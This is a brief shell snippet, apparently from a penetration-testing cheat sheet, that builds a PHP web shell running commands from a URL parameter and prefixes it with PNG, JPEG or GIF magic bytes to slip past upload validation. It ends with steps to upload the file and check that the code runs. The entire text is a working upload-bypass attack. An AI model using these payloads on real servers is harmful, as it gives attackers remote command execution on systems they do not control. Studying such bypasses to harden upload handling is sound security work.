# Step 1: Create file with valid magic bytes
# PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A
echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > shell.php

# Step 2: JPEG magic bytes: FF D8 FF
echo -e "\xFF\xD8\xFF<?php system(\$_GET['cmd']); ?>" > shell.php

# Step 3: GIF magic bytes: 47 49 46 38 39 61
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php

# Step 4: Upload and verify
# File should pass magic byte validation
# Check if code still executes